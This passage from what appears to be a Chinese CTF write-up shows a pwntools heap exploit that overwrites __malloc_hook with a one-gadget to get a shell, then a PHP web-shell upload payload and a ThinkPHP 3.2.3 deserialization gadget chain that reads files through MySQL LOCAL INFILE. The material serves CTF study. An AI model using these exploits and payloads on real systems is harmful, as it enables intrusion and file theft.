&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x78&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;View&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x68&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#+ 0x100000000&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x10&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;View&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xA10&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HEAP:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bnQgPj4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12345678&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;


&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bnQgPj4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12345678&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xF1207&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
&lt;h3 id=&#34;write_shell&#34;&gt;write_shell&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pwd&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到存储路径&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;upload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;lt;?=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`rev%09/*gggg*`&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果逆转一下就行&lt;/p&gt;
&lt;h3 id=&#34;easytp&#34;&gt;easytp&lt;/h3&gt;
&lt;p&gt;扫目录得到&lt;code&gt;www.zip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;看到是&lt;code&gt;ThinkPHP 3.2.3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/home/index&lt;/code&gt;有反序列化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210402202821980.png&#34; alt=&#34;image-20210402202821980&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;与源码diff一下，看到改了&lt;code&gt;Library\Think\Db\Driver.class.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/asadas.png&#34; alt=&#34;asadas&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;猜测有mysql，记得tp3.2.3有反序列化打数据库类的链：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA&lt;/p&gt;
&lt;p&gt;尝试了一下，可以任意文件读&lt;/p&gt;
&lt;p&gt;没读到有用的信息，猜测数据库密码123456&lt;/p&gt;
&lt;p&gt;然后可以报错注入&lt;/p&gt;
&lt;p&gt;poc:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think\Db\Driver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PDO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Mysql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;PDO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;MYSQL_ATTR_LOCAL_INFILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// 开启才能读取文件
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;debug&amp;#34;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;database&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;mysql&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;hostname&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;hostport&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;3306&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;charset&amp;#34;&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;utf8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;root&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think\Image\Driver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think\Session\Driver\Memcache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Imagick&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$img&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Memcache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think\Session\Driver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think\Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Memcache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Think\Db\Driver\Mysql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
